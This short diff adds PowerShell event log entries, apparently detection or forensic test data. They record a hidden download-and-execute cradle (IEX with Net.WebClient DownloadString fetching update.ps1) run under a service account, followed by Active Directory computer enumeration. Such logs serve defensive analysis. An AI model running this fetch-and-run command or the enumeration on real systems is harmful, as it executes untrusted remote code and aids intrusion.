@@ -1,0 +1,4 @@
+2026-05-01T22:17:02Z AD01 PowerShell 4104: Creating Scriptblock text: IEX(New-Object Net.WebClient).DownloadString('http://10.20.30.15/update.ps1')
+2026-05-01T22:17:05Z AD01 PowerShell 4103: CommandInvocation Invoke-Expression User=CORP\svc-vpn-backup HostApplication=powershell -nop -w hidden
+2026-05-01T22:20:22Z AD01 PowerShell 4104: Creating Scriptblock text: Get-ADComputer -Filter * -Properties OperatingSystem | Select Name,OperatingSystem
+
